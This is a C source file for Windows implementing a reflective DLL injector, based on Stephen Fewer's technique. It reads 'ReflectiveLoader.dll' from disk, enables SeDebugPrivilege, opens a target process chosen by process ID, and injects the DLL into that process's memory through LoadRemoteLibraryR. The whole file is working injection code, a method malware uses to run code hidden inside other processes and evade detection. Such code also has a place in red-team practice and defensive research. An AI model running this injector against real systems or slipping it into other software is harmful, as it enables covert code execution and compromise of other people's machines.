#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tchar.h>
#include <stdlib.h>
#include <stdio.h>
#include "LoadLibraryR.h"

#pragma comment(lib,"Advapi32.lib")

//===============================================================================================//
// This technique in this file is based on Stephen Fewer's Reflective DLL Injection and thanks to depthsecurity.com for their great tutorial on the subject.
// source: https://github.com/stephenfewer/ReflectiveDLLInjection/
// source: https://www.depthsecurity.com/blog/reflective-dll-injection-in-c/

int _tmain(int argc, TCHAR* argv[])
{
	LPCTSTR cpDllFile = L"ReflectiveLoader.dll";
	HANDLE hFile = NULL;
	HANDLE hModule = NULL;
	HANDLE hProcess = NULL;
	HANDLE hToken = NULL;
	LPVOID lpBuffer = NULL;
	DWORD dwLength = 0;
	DWORD dwBytesRead = 0;
	DWORD dwProcessId = 0;
	TOKEN_PRIVILEGES priv = { 0 };

	if (argc == 1)
		dwProcessId = GetCurrentProcessId();
	else
		dwProcessId = (DWORD)_tcstoul(argv[1], NULL, 10);
	_tprintf(L"[+] Target process ID = %lu\n", dwProcessId);

	hFile = CreateFileW(cpDllFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		_tprintf(_T("CreateFile failed. GetLastError=%d\n"), GetLastError());

	dwLength = GetFileSize(hFile, NULL);
	if (dwLength == INVALID_FILE_SIZE || dwLength == 0)
		_tprintf(_T("GetFileSize failed. GetLastError=%d\n"), GetLastError());

	lpBuffer = HeapAlloc(GetProcessHeap(), 0, dwLength);
	if (!lpBuffer)
		_tprintf(_T("HeapAlloc failed. GetLastError=%d\n"), GetLastError());

	if (ReadFile(hFile, lpBuffer, dwLength, &dwBytesRead, NULL) == FALSE)
		_tprintf(_T("ReadFile failed. GetLastError=%d\n"), GetLastError());

	// Open the security context of the current process
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		// Amount of privileges to set
		priv.PrivilegeCount = 1;
		// Mark the privilege as enabled
		priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		// Get the LUID for the privilege
		if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
			// Set the privilege for this process
			AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL);

		CloseHandle(hToken);
	}

	hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
	if (!hProcess)
		_tprintf(_T("OpenProcess failed. GetLastError=%d\n"), GetLastError());

	hModule = LoadRemoteLibraryR(hProcess, lpBuffer, dwLength, NULL);
	if (!hModule) {
		_tprintf(L"Failed to inject the DLL");
		return 1;
	}
	else
	{
		WaitForSingleObject(hModule, INFINITE);
		CloseHandle(hModule);
	}

	_tprintf(L"[+] Injected the '%s' DLL into process %d", cpDllFile, dwProcessId);

	if (lpBuffer)
		HeapFree(GetProcessHeap(), 0, lpBuffer);

	if (hProcess)
		CloseHandle(hProcess);
	return 0;
}